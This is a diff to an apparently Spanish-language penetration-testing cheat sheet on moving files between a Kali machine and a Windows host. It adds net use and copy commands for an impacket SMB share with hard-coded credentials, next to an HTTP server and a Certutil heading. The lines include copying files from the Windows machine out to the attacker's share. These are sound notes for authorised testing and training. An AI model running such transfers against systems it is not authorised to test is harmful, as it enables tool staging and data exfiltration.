@@ -123,7 +123,11 @@ C:\Windows\Temp
 3. ❯ python3 -m http.server 80      # Creamos un servidor 
 
 4. ❯ copy \\IP_Kali\smbFolder\file.exe      # Copiar de Kali a Windows 
-4  ❯ copy .\file.exe \\IP_Kali\smbFolder\   # Copiar de Windows a Kali
+   ❯ copy .\file.exe \\IP_Kali\smbFolder\   # Copiar de Windows a Kali
+
+5. ❯ net use \\IP_Kali\smbFolder /u:omar omar123
+   ❯ dir \\IP_Kali\smbFolder\             # Listar lo que hay en Kali 
+   ❯ copy file.exe \\IP_Kali\smbFolder\   # Copiar de Windows a Kali
 ```
 
 ```bash 
@@ -131,7 +135,10 @@ C:\Windows\Temp
 3. ❯ http://IP    # Ingresar desde el navegador web, colocar la IP que se esta compartiendo y descargar el recurso  
 
 # Recurso compartido para compartir o recibir un archivo 
-4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support     
+4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support  
+
+# Cuando exista un error por políticas en Windows agregar credenciales 
+5. ❯ impacket-smbserver smbFolder $(pwd) -smb2support -username omar -password omar123  
 ```
 
 ## Certutil 
